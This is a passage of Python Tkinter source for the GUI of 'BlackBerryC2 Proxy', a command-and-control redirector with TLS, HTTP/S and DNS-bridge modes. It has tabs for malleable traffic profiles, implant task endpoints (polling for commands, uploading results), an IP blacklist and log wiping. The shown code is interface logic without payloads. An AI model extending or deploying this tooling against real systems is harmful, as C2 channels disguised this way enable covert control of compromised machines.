    for w in ("TCheckbutton", "TRadiobutton"):
        style.configure(w,
            background=BG, foreground=TEXT,
            indicatorcolor=ENTRY, indicatorbackground=ENTRY,
            font=("Segoe UI", 9))
        style.map(w,
            background=[("active", BG)],
            indicatorcolor=[("selected", ACCENT), ("active", ACCENT)],
            foreground=[("active", TEXT)])

    style.configure("TSeparator", background=BORDER)
    style.configure("TScale",
        background=BG, troughcolor=SURF,
        slidercolor=BTN, bordercolor=BORDER)
    style.map("TScale", slidercolor=[("active", ACCENT)])

    # Globales tk (Listbox, Text, Entry, Menu)
    root.option_add("*Listbox.background",        SURF)
    root.option_add("*Listbox.foreground",        TEXT)
    root.option_add("*Listbox.selectBackground",  SEL)
    root.option_add("*Listbox.selectForeground",  SEL_FG)
    root.option_add("*Listbox.borderWidth",       "1")
    root.option_add("*Listbox.highlightThickness","1")
    root.option_add("*Listbox.highlightColor",    BORDER)
    root.option_add("*Listbox.font",              "Consolas 9")

    root.option_add("*Entry.background",          ENTRY)
    root.option_add("*Entry.foreground",          TEXT)
    root.option_add("*Entry.insertBackground",    ACCENT)
    root.option_add("*Entry.selectBackground",    SEL)
    root.option_add("*Entry.selectForeground",    SEL_FG)
    root.option_add("*Entry.highlightColor",      ACCENT)
    root.option_add("*Entry.highlightThickness",  "1")
    root.option_add("*Entry.borderWidth",         "0")

    root.option_add("*Text.background",           SURF)
    root.option_add("*Text.foreground",           TEXT)
    root.option_add("*Text.insertBackground",     ACCENT)
    root.option_add("*Text.selectBackground",     SEL)
    root.option_add("*Text.selectForeground",     SEL_FG)
    root.option_add("*Text.highlightThickness",   "0")
    root.option_add("*Text.borderWidth",          "0")

    root.option_add("*Menu.background",           SURF)
    root.option_add("*Menu.foreground",           TEXT)
    root.option_add("*Menu.activeBackground",     SEL)
    root.option_add("*Menu.activeForeground",     SEL_FG)
    root.option_add("*Menu.borderWidth",          "1")
    root.option_add("*Menu.relief",               "flat")
    root.option_add("*Menu.borderColor",          BORDER)

    root.option_add("*Dialog.background",         BG)
    root.option_add("*Dialog.foreground",         TEXT)
    root.option_add("*toplevel.background",       BG)

    return style

# ── PILL TOGGLE HELPERS ───────────────────────────────────────────────────────
def _make_pill_group(parent, options, var, command=None):
    """Reemplaza Radiobutton: pills visuales mutuamente excluyentes."""
    pills = {}
    A = _TH["accent"]; BG_IN = _TH["btn_bg"]
    FG_ACT = "#000000"; FG_IN = _TH["text_dim"]; BD = _TH["border"]

    def _refresh(*_):
        cur = str(var.get())
        for val, lbl in pills.items():
            if str(val) == cur:
                lbl.config(bg=A, fg=FG_ACT, highlightbackground=A, highlightthickness=2)
            else:
                lbl.config(bg=BG_IN, fg=FG_IN, highlightbackground=BD, highlightthickness=1)

    for label, value in options:
        lbl = tk.Label(parent, text=f"  {label}  ",
                       bg=BG_IN, fg=FG_IN, font=("Segoe UI", 9, "bold"),
                       cursor="hand2", highlightbackground=BD, highlightthickness=1,
                       relief="flat", padx=6, pady=4)
        lbl.pack(side="left", padx=3, pady=4)
        pills[value] = lbl
        def _click(v=value):
            var.set(v); _refresh()
            if command: command()
        lbl.bind("<Button-1>", lambda _, v=value: _click(v))

    var.trace_add("write", _refresh)
    _refresh()
    return pills


def _make_pill_toggle(parent, text_on, text_off, var, command=None):
    """Reemplaza Checkbutton: un pill ON/OFF con color contrastante."""
    A = _TH["accent"]; BG_IN = _TH["btn_bg"]
    FG_ACT = "#000000"; FG_IN = _TH["text_dim"]; BD = _TH["border"]

    lbl = tk.Label(parent, text=f"  {text_off}  ",
                   bg=BG_IN, fg=FG_IN, font=("Segoe UI", 9, "bold"),
                   cursor="hand2", highlightbackground=BD, highlightthickness=1,
                   relief="flat", padx=6, pady=4)
    lbl.pack(side="left", padx=3, pady=4)

    def _refresh(*_):
        if var.get():
            lbl.config(bg=A, fg=FG_ACT, text=f"  {text_on}  ",
                       highlightbackground=A, highlightthickness=2)
        else:
            lbl.config(bg=BG_IN, fg=FG_IN, text=f"  {text_off}  ",
                       highlightbackground=BD, highlightthickness=1)

    def _click():
        var.set(not var.get()); _refresh()
        if command: command()

    lbl.bind("<Button-1>", lambda _: _click())
    var.trace_add("write", _refresh)
    _refresh()
    return lbl


class BlackBerryProxyGUI:
    """Interfaz gráfica completa del proxy."""
    
    def __init__(self, root):
        self.root = root
        self.root.title("BlackBerryC2 Proxy  v5.3  —  TLS · HTTP/S · DNS Bridge")
        self.root.geometry("980x740")
        self.root.minsize(860, 620)
        
        try:
            if os.path.exists(DEFAULT_ICON):
                self.root.iconbitmap(DEFAULT_ICON)
        except:
            pass
        
        self.running     = False
        self.server_thread = None
        self.blocked_ips = load_blacklist()
        
        self.mode_var        = tk.StringVar(value='both')
        self.https_var       = tk.BooleanVar(value=False)
        self.traffic_enabled = tk.BooleanVar(value=False)
        self.verbose_var     = tk.IntVar(value=0)
        self.dns_enabled_var = tk.BooleanVar(value=False)
        
        self._create_ui()
        self.update_display()
        self._dns_log_poll()
        self.root.after(500, self.load_logs)   # cargar logs al arrancar
        self._schedule_log_refresh()             # auto-refresh cada 15s
    
    def _create_ui(self):
        """Crea la interfaz de usuario."""
        # Notebook principal
        self.notebook = ttk.Notebook(self.root)
        self.notebook.pack(fill='both', expand=True, padx=5, pady=5)
        
        # === TAB CONTROL ===
        control_frame = ttk.Frame(self.notebook)
        self.notebook.add(control_frame, text='Control')
        self._create_control_tab(control_frame)
        
        # === TAB CONFIGURACIÓN ===
        config_frame = ttk.Frame(self.notebook)
        self.notebook.add(config_frame, text='Configuración')
        self._create_config_tab(config_frame)
        
        # === TAB ENDPOINTS ===
        endpoints_frame = ttk.Frame(self.notebook)
        self.notebook.add(endpoints_frame, text='Endpoints')
        self._create_endpoints_tab(endpoints_frame)
        
        # === TAB BLACKLIST ===
        blacklist_frame = ttk.Frame(self.notebook)
        self.notebook.add(blacklist_frame, text='Blacklist')
        self._create_blacklist_tab(blacklist_frame)
        
        # === TAB LOGS ===
        logs_frame = ttk.Frame(self.notebook)
        self.notebook.add(logs_frame, text='Logs')
        self._create_logs_tab(logs_frame)
        
        # === TAB TRÁFICO ===
        traffic_frame = ttk.Frame(self.notebook)
        self.notebook.add(traffic_frame, text='Tráfico')
        self._create_traffic_tab(traffic_frame)

        # === TAB PERFILES ===
        profiles_frame = ttk.Frame(self.notebook)
        self.notebook.add(profiles_frame, text='🎭 Perfiles')
        self._create_profiles_tab(profiles_frame)

        # === TAB DNS BRIDGE ===
        dns_frame = ttk.Frame(self.notebook)
        self.notebook.add(dns_frame, text='🌐 DNS Bridge')
        self._create_dns_tab(dns_frame)
    

    def _create_profiles_tab(self, parent):
        """Tab de gestión de perfiles malleable de tráfico C2."""
        if not _PROFILES_AVAILABLE:
            ttk.Label(parent, text="  ⚠  bb_profiles.py no encontrado. Colócalo junto al proxy.",
                      foreground='#f14c4c', font=('Consolas', 9)).pack(pady=20, anchor='w', padx=16)
            return

        # ── Perfil activo ─────────────────────────────────────────────────────
        active_f = ttk.LabelFrame(parent, text="Perfil Activo")
        active_f.pack(fill='x', padx=10, pady=6)

        af_row = ttk.Frame(active_f); af_row.pack(fill='x', padx=8, pady=6)
        self._prof_active_lbl = ttk.Label(af_row,
            text=f"Activo: {get_active_profile_id()}",
            font=('Consolas', 10, 'bold'), foreground='#3794ff')
        self._prof_active_lbl.pack(side='left')
        self._prof_desc_lbl = ttk.Label(af_row, text="",
            foreground='#7f7f7f', font=('Segoe UI', 8, 'italic'))
        self._prof_desc_lbl.pack(side='left', padx=14)

        # ── Selector ──────────────────────────────────────────────────────────
        sel_f = ttk.LabelFrame(parent, text="Seleccionar y Activar Perfil")
        sel_f.pack(fill='x', padx=10, pady=4)

        sel_row = ttk.Frame(sel_f); sel_row.pack(fill='x', padx=8, pady=6)
        ttk.Label(sel_row, text="Perfil:").pack(side='left')
        self._prof_var = tk.StringVar(value=get_active_profile_id())
        self._prof_combo = ttk.Combobox(sel_row, textvariable=self._prof_var,
                                         width=22, state='readonly')
        self._prof_combo.pack(side='left', padx=6)
        self._refresh_profile_list()

        ttk.Button(sel_row, text="✓ Activar Perfil",
                   command=self._prof_activate, style='Primary.TButton').pack(side='left', padx=4)
        ttk.Button(sel_row, text="⇄ Cargar Endpoints en Proxy",
                   command=self._prof_load_endpoints).pack(side='left', padx=4)

        # ── Detalle ───────────────────────────────────────────────────────────
        detail_f = ttk.LabelFrame(parent, text="Detalle del Perfil Seleccionado")
        detail_f.pack(fill='both', expand=True, padx=10, pady=4)

        self._prof_detail_box = scrolledtext.ScrolledText(
            detail_f, height=16, state='disabled',
            font=('Consolas', 9),
            bg='#000000', fg='#ffffff',
            insertbackground='#3794ff',
            selectbackground='#264f78', selectforeground='#ffffff',
            relief='flat', borderwidth=0)
        self._prof_detail_box.pack(fill='both', expand=True, padx=5, pady=5)

        # ── Botones ───────────────────────────────────────────────────────────
        btn_row = ttk.Frame(parent); btn_row.pack(fill='x', padx=10, pady=4)
        ttk.Button(btn_row, text="↻ Actualizar",
                   command=self._refresh_profile_list).pack(side='left', padx=2)
        ttk.Button(btn_row, text="{ } Ver JSON",
                   command=self._prof_show_json).pack(side='left', padx=2)
        ttk.Button(btn_row, text="💾 Exportar",
                   command=self._prof_export).pack(side='left', padx=2)
        ttk.Button(btn_row, text="📂 Importar perfil",
                   command=self._prof_import).pack(side='left', padx=2)

        self._prof_combo.bind('<<ComboboxSelected>>', lambda _: self._prof_show_detail())
        self._prof_show_detail()

    def _refresh_profile_list(self):
        profiles = list_profiles()
        keys = list(profiles.keys())
        self._prof_combo['values'] = keys
        self._prof_names = profiles
        if self._prof_var.get() not in keys and keys:
            self._prof_var.set(keys[0])

    def _prof_show_detail(self):
        pid = self._prof_var.get()
        try:
            prof = load_profile(pid)
            L = []
            L.append(f"{'─'*58}")
            L.append(f"  {prof.name.upper()}")
            L.append(f"  {prof.description}")
            L.append(f"{'─'*58}")
            L.append("")
            L.append("  USER-AGENTS:")
            for ua in prof._client.get('user_agents', []):
                L.append(f"    • {ua[:75]}")
            L.append("")
            L.append("  URIs POR TAREA:")
            for task, uris in prof.all_uris().items():
                L.append(f"    [{task}]")
                for uri in uris[:2]:
                    L.append(f"      {uri}")
            L.append("")
            L.append("  HEADERS ESTÁTICOS (cliente):")
            for k, v in prof._client.get('static_headers', {}).items():
                L.append(f"    {k}: {str(v)[:55]}...")
            L.append("")
            L.append(f"  DATOS CLIENTE→SERVIDOR: {prof.data_encoding()}")
            L.append(f"  DATOS SERVIDOR→CLIENTE: {prof.server_data_encoding()}")
            L.append("")
            ivs = prof._client.get('intervals_ms', {})
            L.append(f"  INTERVALOS: {ivs.get('min',5000)}-{ivs.get('max',30000)}ms  Jitter: {prof._client.get('jitter_pct',20)}%")
            L.append("")
            L.append("  HEADERS DE RESPUESTA (servidor):")
            for k, v in prof._server.get('response_headers', {}).items():
                L.append(f"    {k}: {str(v)[:55]}")
            txt = '\n'.join(L)
            self._prof_detail_box.configure(state='normal')
            self._prof_detail_box.delete(1.0, tk.END)
            self._prof_detail_box.insert(tk.END, txt)
            self._prof_detail_box.configure(state='disabled')
        except Exception as e:
            self._prof_detail_box.configure(state='normal')
            self._prof_detail_box.delete(1.0, tk.END)
            self._prof_detail_box.insert(tk.END, f"Error: {e}")
            self._prof_detail_box.configure(state='disabled')

    def _prof_activate(self):
        pid = self._prof_var.get()
        try:
            prof = set_active_profile(pid)
            self._prof_active_lbl.config(text=f"Activo: {pid}  ✓")
            self._prof_desc_lbl.config(text=prof.description if prof else "")
            self.log_status(f"[PERFIL] Perfil activo: {prof.name if prof else pid}")
        except Exception as e:
            messagebox.showerror("Error", str(e))

    def _prof_load_endpoints(self):
        pid = self._prof_var.get()
        try:
            prof = load_profile(pid)
            endpoints = profile_endpoints_for_proxy(prof)
            if not endpoints:
                messagebox.showwarning("Sin endpoints", "El perfil no define endpoints.")
                return
            self._ep_tree.delete(*self._ep_tree.get_children())
            for ep in endpoints:
                self._ep_tree.insert('', 'end', iid=ep['path'],
                    values=(ep['path'], ep['task'], ep['desc']))
            proxy_config['endpoints']      = [e['path'] for e in endpoints]
            proxy_config['endpoint_tasks'] = {e['path']: e.get('task','message') for e in endpoints}
            self.log_status(f"[PERFIL] {len(endpoints)} endpoints del perfil '{prof.name}' cargados")
            messagebox.showinfo("Endpoints cargados",
                f"{len(endpoints)} endpoints del perfil '{prof.name}' cargados en el proxy.\n\n"
                "Ve a la pestaña Endpoints para revisar.")
        except Exception as e:
            messagebox.showerror("Error", str(e))

    def _prof_show_json(self):
        pid = self._prof_var.get()
        try:
            prof = load_profile(pid)
            js = json.dumps(prof.to_dict(), indent=2, ensure_ascii=False)
            dlg = tk.Toplevel(self.root)
            dlg.title(f"JSON — {prof.name}")
            dlg.geometry("700x580")
            dlg.configure(bg='#000000')
            box = scrolledtext.ScrolledText(dlg, font=('Consolas', 9),
                bg='#0a0a0a', fg='#ffffff',
                selectbackground='#264f78', selectforeground='#ffffff',
                relief='flat')
            box.pack(fill='both', expand=True, padx=5, pady=5)
            box.insert(tk.END, js)
        except Exception as e:
            messagebox.showerror("Error", str(e))

    def _prof_export(self):
        pid = self._prof_var.get()
        try:
            prof = load_profile(pid)
            path = filedialog.asksaveasfilename(
                title="Exportar perfil", defaultextension=".json",
                initialfile=f"{pid}_profile.json",
                filetypes=[("JSON", "*.json")])
            if path:
                with open(path, 'w', encoding='utf-8') as f:
                    json.dump(prof.to_dict(), f, indent=2, ensure_ascii=False)
                messagebox.showinfo("Exportado", f"Perfil exportado:\n{path}")
        except Exception as e:
            messagebox.showerror("Error", str(e))

    def _prof_import(self):
        path = filedialog.askopenfilename(
            title="Importar perfil",
            filetypes=[("JSON/YAML", "*.json *.yaml *.yml"), ("Todos", "*.*")])
        if not path: return
        try:
            with open(path, 'r', encoding='utf-8') as f:
                if path.endswith(('.yaml', '.yml')):
                    import yaml; data = yaml.safe_load(f)
                else:
                    data = json.load(f)
            pid = os.path.splitext(os.path.basename(path))[0]
            saved = save_profile(pid, data)
            self._refresh_profile_list()
            self._prof_var.set(pid)
            self._prof_show_detail()
            messagebox.showinfo("Importado",
                f"Perfil '{data.get('name', pid)}' importado.\nGuardado en: {saved}")
        except Exception as e:
            messagebox.showerror("Error", str(e))


    def _create_control_tab(self, parent):
        """Crea el tab de control."""
        # Frame de estado
        status_frame = ttk.LabelFrame(parent, text="Estado del Proxy")
        status_frame.pack(fill='x', padx=10, pady=5)
        
        self.info_label = ttk.Label(status_frame, text="Estado: Detenido", font=('Arial', 12, 'bold'))
        self.info_label.pack(pady=5)
        
        self.mode_label = ttk.Label(status_frame, text="Modo: -")
        self.mode_label.pack()
        
        self.connections_label = ttk.Label(status_frame, text="Conexiones: 0")
        self.connections_label.pack()
        
        # Frame de botones
        btn_frame = ttk.Frame(parent)
        btn_frame.pack(fill='x', padx=10, pady=10)
        
        self.btn_start = ttk.Button(btn_frame, text="▶  Iniciar", command=self.start_proxy, width=15,
                                     style="Primary.TButton")
        self.btn_start.pack(side='left', padx=5)

        self.btn_stop = ttk.Button(btn_frame, text="■  Detener", command=self.stop_proxy, width=15,
                                   state='disabled', style="Danger.TButton")
        self.btn_stop.pack(side='left', padx=5)
        
        # Modo verbose
        verbose_frame = ttk.LabelFrame(parent, text="Modo Verbose")
        verbose_frame.pack(fill='x', padx=10, pady=5)
        
        _make_pill_group(verbose_frame,
            [("Silencioso", 0), ("Debug", 1), ("Verbose", 2)],
            self.verbose_var, command=self._update_verbose)
        
        # Log de estado
        log_frame = ttk.LabelFrame(parent, text="Log de Actividad")
        log_frame.pack(fill='both', expand=True, padx=10, pady=5)
        
        self.status_box = scrolledtext.ScrolledText(log_frame, height=15, state='disabled',
                                                    font=('Consolas', 9),
                                                    bg='#0a0c10', fg='#00e676',
                                                    insertbackground='#00d4ff',
                                                    selectbackground='#003459',
                                                    relief='flat', borderwidth=0)
        self.status_box.pack(fill='both', expand=True, padx=5, pady=5)
    
    def _create_config_tab(self, parent):
        """Crea el tab de configuración."""
        # Modo de operación
        mode_frame = ttk.LabelFrame(parent, text="Modo de Operación")
        mode_frame.pack(fill='x', padx=10, pady=5)
        
        _make_pill_group(mode_frame,
            [("Solo TLS", 'tls'), ("Solo HTTP", 'http'), ("TLS + HTTP", 'both')],
            self.mode_var)
        
        _make_pill_toggle(mode_frame, "🔒 HTTPS ACTIVO", "🔓 HTTPS INACTIVO", self.https_var)
        
        # Configuración TLS
        tls_frame = ttk.LabelFrame(parent, text="Configuración TLS")
        tls_frame.pack(fill='x', padx=10, pady=5)
        
        row1 = ttk.Frame(tls_frame)
        row1.pack(fill='x', padx=5, pady=2)
        ttk.Label(row1, text="Host:").pack(side='left')
        self.tls_host = ttk.Entry(row1, width=20)
        self.tls_host.insert(0, DEFAULT_LISTEN_HOST)
        self.tls_host.pack(side='left', padx=5)
        ttk.Label(row1, text="Puerto:").pack(side='left')
        self.tls_port = ttk.Entry(row1, width=10)
        self.tls_port.insert(0, str(DEFAULT_LISTEN_PORT_TLS))
        self.tls_port.pack(side='left', padx=5)
        
        # Configuración HTTP
        http_frame = ttk.LabelFrame(parent, text="Configuración HTTP")
        http_frame.pack(fill='x', padx=10, pady=5)
        
        row2 = ttk.Frame(http_frame)
        row2.pack(fill='x', padx=5, pady=2)
        ttk.Label(row2, text="Host:").pack(side='left')
        self.http_host = ttk.Entry(row2, width=20)
        self.http_host.insert(0, DEFAULT_LISTEN_HOST)
        self.http_host.pack(side='left', padx=5)
        ttk.Label(row2, text="Puerto:").pack(side='left')
        self.http_port = ttk.Entry(row2, width=10)
        self.http_port.insert(0, str(DEFAULT_LISTEN_PORT_HTTP))
        self.http_port.pack(side='left', padx=5)
        
        # Backend
        backend_frame = ttk.LabelFrame(parent, text="Backend (Servidor C2)")
        backend_frame.pack(fill='x', padx=10, pady=5)
        
        row3 = ttk.Frame(backend_frame)
        row3.pack(fill='x', padx=5, pady=2)
        ttk.Label(row3, text="Host:").pack(side='left')
        self.backend_host = ttk.Entry(row3, width=20)
        self.backend_host.insert(0, DEFAULT_TARGET_HOST)
        self.backend_host.pack(side='left', padx=5)
        ttk.Label(row3, text="Puerto:").pack(side='left')
        self.backend_port = ttk.Entry(row3, width=10)
        self.backend_port.insert(0, str(DEFAULT_TARGET_PORT))
        self.backend_port.pack(side='left', padx=5)
        
        # Certificados
        cert_frame = ttk.LabelFrame(parent, text="Certificados TLS")
        cert_frame.pack(fill='x', padx=10, pady=5)
        
        row4 = ttk.Frame(cert_frame)
        row4.pack(fill='x', padx=5, pady=2)
        ttk.Label(row4, text="Certificado:").pack(side='left')
        self.cert_entry = ttk.Entry(row4, width=50)
        self.cert_entry.insert(0, DEFAULT_CERTFILE)
        self.cert_entry.pack(side='left', padx=5)
        ttk.Button(row4, text="...", width=3, command=lambda: self._browse_file(self.cert_entry)).pack(side='left')
        
        row5 = ttk.Frame(cert_frame)
        row5.pack(fill='x', padx=5, pady=2)
        ttk.Label(row5, text="Clave:").pack(side='left')
        self.key_entry = ttk.Entry(row5, width=50)
        self.key_entry.insert(0, DEFAULT_KEYFILE)
        self.key_entry.pack(side='left', padx=5)
        ttk.Button(row5, text="...", width=3, command=lambda: self._browse_file(self.key_entry)).pack(side='left')
    
    def _create_endpoints_tab(self, parent):
        """Endpoints HTTP con descripción, edición y persistencia opcional."""
        # ── Cabecera ────────────────────────────────────────────────────────
        hdr = ttk.Frame(parent)
        hdr.pack(fill='x', padx=10, pady=(6, 0))
        ttk.Label(hdr, text="Endpoints HTTP permitidos",
                  font=('Arial', 10, 'bold')).pack(side='left')
        # Aviso persistencia cargada
        custom_loaded = os.path.isfile(ENDPOINTS_CUSTOM_FILE)
        tag = " ✔ personalizados cargados" if custom_loaded else " (base predeterminada)"
        self._ep_hdr_lbl = ttk.Label(hdr, text=tag,
                                      foreground='#00c853' if custom_loaded else '#888',
                                      font=('Arial', 8))
        self._ep_hdr_lbl.pack(side='left', padx=6)

        # ── Treeview: Endpoint | Descripción ─────────────────────────────────
        tree_f = ttk.Frame(parent)
        tree_f.pack(fill='both', expand=True, padx=10, pady=4)

        cols = ('path', 'task', 'desc')
        self._ep_tree = ttk.Treeview(tree_f, columns=cols, show='headings', height=12,
                                      selectmode='browse')
        self._ep_tree.heading('path', text='Endpoint')
        self._ep_tree.heading('task', text='Tarea')
        self._ep_tree.heading('desc', text='Descripción')
        self._ep_tree.column('path', width=200, anchor='w')
        self._ep_tree.column('task', width=110, anchor='center')
        self._ep_tree.column('desc', width=380, anchor='w')

        ep_sb = ttk.Scrollbar(tree_f, orient='vertical', command=self._ep_tree.yview)
        self._ep_tree.configure(yscrollcommand=ep_sb.set)
        self._ep_tree.pack(side='left', fill='both', expand=True)
        ep_sb.pack(side='right', fill='y')

        self._ep_tree.bind('<<TreeviewSelect>>', self._ep_on_select)

        # Poblar lista
        self._ep_reload_tree()

        # ── Editor inline ─────────────────────────────────────────────────────
        edit_f = ttk.LabelFrame(parent, text="Editar / Agregar endpoint")
        edit_f.pack(fill='x', padx=10, pady=4)

        r1 = ttk.Frame(edit_f); r1.pack(fill='x', padx=6, pady=3)
        ttk.Label(r1, text="Ruta:", width=12).pack(side='left')
        self._ep_path_var = tk.StringVar()
        self._ep_path_entry = ttk.Entry(r1, textvariable=self._ep_path_var, width=40)
        self._ep_path_entry.pack(side='left', padx=4)
        ttk.Label(r1, text="  (debe comenzar con /)", foreground='#6e7681',
                  font=('Arial', 8)).pack(side='left')

        r1b = ttk.Frame(edit_f); r1b.pack(fill='x', padx=6, pady=3)
        ttk.Label(r1b, text="Tarea:", width=12).pack(side='left')
        self._ep_task_var = tk.StringVar(value='message')
        task_cb = ttk.Combobox(r1b, textvariable=self._ep_task_var, width=18,
                                values=sorted(VALID_TASKS), state='readonly')
        task_cb.pack(side='left', padx=4)
        task_descs = {
            "handshake":     "Intercambio ECDHE de clave — primera conexión",
            "polling":       "Espera comandos del C2 (long-poll)",
            "upload":        "Envía resultados/datos al servidor",
            "download":      "Recibe archivos del servidor",
            "message":       "Mensajes cifrados normales",
            "file_transfer": "Transferencia de archivos binarios",
        }
        self._ep_task_info = ttk.Label(r1b, text=task_descs.get('message', ''),
                                        foreground='#6e7681', font=('Arial', 8))
        self._ep_task_info.pack(side='left', padx=8)
        def _update_task_info(*_):
            t = self._ep_task_var.get()
            self._ep_task_info.config(text=task_descs.get(t, ''))
        self._ep_task_var.trace_add('write', _update_task_info)

        r2 = ttk.Frame(edit_f); r2.pack(fill='x', padx=6, pady=3)
        ttk.Label(r2, text="Descripción:", width=12).pack(side='left')
        self._ep_desc_var = tk.StringVar()
        ttk.Entry(r2, textvariable=self._ep_desc_var, width=70).pack(side='left', padx=4)

        # ── Botones de acción ─────────────────────────────────────────────────
        btn_f = ttk.Frame(parent); btn_f.pack(fill='x', padx=10, pady=(0, 6))

        ttk.Button(btn_f, text="➕ Agregar / Actualizar",
                   command=self._ep_add_or_update).pack(side='left', padx=2)
        ttk.Button(btn_f, text="🗑 Eliminar",
                   command=self._ep_remove).pack(side='left', padx=2)
        ttk.Button(btn_f, text="↩ Restaurar base",
                   command=self._restore_endpoints).pack(side='left', padx=2)

        ttk.Separator(btn_f, orient='vertical').pack(side='left', padx=8, fill='y')

        ttk.Button(btn_f, text="💾 Guardar (temporal)",
                   command=self._ep_save_temp).pack(side='left', padx=2)
        ttk.Button(btn_f, text="💾 Guardar (persistente)",
                   command=self._ep_save_persistent).pack(side='left', padx=2)
    
    def _create_blacklist_tab(self, parent):
        """Crea el tab de blacklist."""
        info_label = ttk.Label(parent, text="IPs bloqueadas permanentemente")
        info_label.pack(pady=5)
        
        list_frame = ttk.Frame(parent)
        list_frame.pack(fill='both', expand=True, padx=10, pady=5)
        
        self.blacklist_box = tk.Listbox(list_frame, height=15, font=('Consolas', 10))
        scrollbar = ttk.Scrollbar(list_frame, orient='vertical', command=self.blacklist_box.yview)
        self.blacklist_box.configure(yscrollcommand=scrollbar.set)
        
        self.blacklist_box.pack(side='left', fill='both', expand=True)
        scrollbar.pack(side='right', fill='y')
        
        # Cargar IPs bloqueadas
        self._refresh_blacklist()
        
        # Botones
        btn_frame = ttk.Frame(parent)
        btn_frame.pack(fill='x', padx=10, pady=5)
        
        self.new_ip = ttk.Entry(btn_frame, width=20)
        self.new_ip.pack(side='left', padx=5)
        
        ttk.Button(btn_frame, text="Bloquear", command=self._block_ip).pack(side='left', padx=5)
        ttk.Button(btn_frame, text="Desbloquear", command=self._unblock_ip).pack(side='left', padx=5)
        ttk.Button(btn_frame, text="Guardar", command=self.save_blacklist_file).pack(side='left', padx=5)
        ttk.Button(btn_frame, text="Recargar", command=self._reload_blacklist).pack(side='left', padx=5)
    
    def _create_logs_tab(self, parent):
        """Crea el tab de logs con tabs separados para HTTP/S, TLS, Proxy y Server - CORREGIDO."""
        # Notebook para logs separados
        logs_notebook = ttk.Notebook(parent)
        logs_notebook.pack(fill='both', expand=True, padx=5, pady=5)
        
        # === LOG HTTP/HTTPS ===
        http_frame = ttk.Frame(logs_notebook)
        logs_notebook.add(http_frame, text="HTTP/S")
        
        self.http_logs_box = scrolledtext.ScrolledText(http_frame, height=20, state='disabled',
                                                        font=('Consolas', 9),
                                                        bg='#0a0c10', fg='#00e5ff',
                                                        insertbackground='#00d4ff',
                                                        selectbackground='#003459',
                                                        relief='flat', borderwidth=0)
        self.http_logs_box.pack(fill='both', expand=True, padx=5, pady=5)
        
        http_btn = ttk.Frame(http_frame)
        http_btn.pack(fill='x', padx=5, pady=2)
        ttk.Button(http_btn, text="Recargar", command=self.load_logs).pack(side='left', padx=5)
        ttk.Button(http_btn, text="🗑 Borrado seguro", command=lambda: self.clear_logs('http')).pack(side='left', padx=5)
        ttk.Label(http_btn, text="Logs de tráfico HTTP/HTTPS").pack(side='right', padx=5)
        
        # === LOG TLS ===
        tls_frame = ttk.Frame(logs_notebook)
        logs_notebook.add(tls_frame, text="TLS")
        
        self.tls_logs_box = scrolledtext.ScrolledText(tls_frame, height=20, state='disabled',
                                                       font=('Consolas', 9),
                                                       bg='#0a0c10', fg='#ce93d8',
                                                       insertbackground='#00d4ff',
                                                       selectbackground='#003459',
                                                       relief='flat', borderwidth=0)
        self.tls_logs_box.pack(fill='both', expand=True, padx=5, pady=5)
        
        tls_btn = ttk.Frame(tls_frame)
        tls_btn.pack(fill='x', padx=5, pady=2)
        ttk.Button(tls_btn, text="Recargar", command=self.load_logs).pack(side='left', padx=5)
        ttk.Button(tls_btn, text="🗑 Borrado seguro", command=lambda: self.clear_logs('tls')).pack(side='left', padx=5)
        ttk.Label(tls_btn, text="Logs de conexiones TLS").pack(side='right', padx=5)
        
        # Logs del proxy
        proxy_frame = ttk.Frame(logs_notebook)
        logs_notebook.add(proxy_frame, text="Proxy")
        
        self.proxy_logs_box = scrolledtext.ScrolledText(proxy_frame, height=20, state='disabled',
                                                        font=('Consolas', 9),
                                                        bg='#0a0c10', fg='#ffb74d',
                                                        insertbackground='#00d4ff',
                                                        selectbackground='#003459',
                                                        relief='flat', borderwidth=0)
        self.proxy_logs_box.pack(fill='both', expand=True, padx=5, pady=5)
        
        proxy_btn = ttk.Frame(proxy_frame)
        proxy_btn.pack(fill='x', padx=5, pady=2)
        ttk.Button(proxy_btn, text="Recargar", command=self.load_logs).pack(side='left', padx=5)
        ttk.Button(proxy_btn, text="🗑 Borrado seguro", command=lambda: self.clear_logs('proxy')).pack(side='left', padx=5)
        ttk.Label(proxy_btn, text="Logs generales del proxy").pack(side='right', padx=5)
        
        # Logs del servidor
        server_frame = ttk.Frame(logs_notebook)
        logs_notebook.add(server_frame, text="Servidor")
        
        self.server_logs_box = scrolledtext.ScrolledText(server_frame, height=20, state='disabled',
                                                         font=('Consolas', 9),
                                                         bg='#0a0c10', fg='#f06292',
                                                         insertbackground='#00d4ff',
                                                         selectbackground='#003459',
                                                         relief='flat', borderwidth=0)
        self.server_logs_box.pack(fill='both', expand=True, padx=5, pady=5)
        
        server_btn = ttk.Frame(server_frame)
        server_btn.pack(fill='x', padx=5, pady=2)
        ttk.Button(server_btn, text="Recargar", command=self.load_logs).pack(side='left', padx=5)
        ttk.Button(server_btn, text="🗑 Borrado seguro", command=lambda: self.clear_logs('server')).pack(side='left', padx=5)
        ttk.Label(server_btn, text="Logs del servidor C2 backend").pack(side='right', padx=5)

        # === LOG DNS BRIDGE ===
        dns_log_frame = ttk.Frame(logs_notebook)
        logs_notebook.add(dns_log_frame, text="DNS Bridge")

        self.dns_logs_box = scrolledtext.ScrolledText(
            dns_log_frame, height=20, state='disabled',
            font=('Consolas', 9),
            bg='#0a0c10', fg='#00e5ff',
            insertbackground='#00d4ff',
            selectbackground='#003459',
            relief='flat', borderwidth=0
        )
        self.dns_logs_box.pack(fill='both', expand=True, padx=5, pady=5)

        dns_btn = ttk.Frame(dns_log_frame)
        dns_btn.pack(fill='x', padx=5, pady=2)
        ttk.Button(dns_btn, text="Recargar",      command=self.load_logs).pack(side='left', padx=5)
        ttk.Button(dns_btn, text="🗑 Borrado seguro",
                   command=lambda: self.clear_logs('dns')).pack(side='left', padx=5)
        ttk.Label(dns_btn, text="Log del canal DNS C2 Bridge").pack(side='right', padx=5)
    
    def _create_traffic_tab(self, parent):
        """Crea el tab de tráfico."""
        # Control
        ctrl_frame = ttk.Frame(parent)
        ctrl_frame.pack(fill='x', padx=10, pady=5)
        
        _make_pill_toggle(ctrl_frame,
            "● Monitor ACTIVO", "○ Monitor INACTIVO",
            self.traffic_enabled, command=self.toggle_traffic_monitor)
        ttk.Button(ctrl_frame, text="Actualizar", command=self.update_traffic).pack(side='left', padx=10)
        ttk.Button(ctrl_frame, text="Limpiar", command=self.clear_traffic).pack(side='left')
        
        # Monitor
        self.traffic_box = scrolledtext.ScrolledText(parent, height=25, state='disabled',
